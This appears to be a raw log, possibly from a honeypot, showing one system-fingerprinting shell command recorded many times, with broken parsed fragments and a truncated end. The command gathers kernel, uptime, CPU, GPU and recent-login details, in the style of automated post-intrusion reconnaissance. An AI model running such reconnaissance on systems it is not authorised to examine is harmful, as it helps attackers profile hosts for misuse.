uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo 